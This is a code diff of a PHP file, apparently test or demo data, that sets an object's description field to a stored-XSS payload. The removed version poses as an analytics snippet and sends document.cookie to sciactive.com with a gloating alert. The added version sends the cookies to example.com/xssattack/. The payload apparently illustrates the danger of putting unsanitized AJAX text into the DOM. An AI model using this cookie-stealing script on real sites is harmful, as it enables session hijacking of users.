@@ -32,18 +32,11 @@ $angela->skills = array('farting','drinking soda','intense death');
 
 $angela->description .= <<<'EOF'
 <script type="text/javascript">
-
-  var _gaq = _gaq || [];
-  _gaq.push(['_setAccount', 'yh4uyh5r']);
-  _gaq.push(['_trackPageview']);
-
-  (function() {
-    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-    ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'sciactive.com/checkoutthesecookies/'+escape(document.cookie)+'/haxor.js';
-    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-  })();
-
-  alert("Haha, I just sent all your cookies for this site to sciactive.com. Since I own sciactive.com, I now have your session cookie. :3\n\nThat's what you get for not sanitizing text from AJAX before sticking it in the DOM.");
+(function(){
+var xss = document.createElement('script'); xss.type = 'text/javascript'; xss.async = true;
+xss.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'example.com/xssattack/'+escape(document.cookie)+'/a.js';
+var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(xss, s);
+})();
 </script>
 EOF;
 
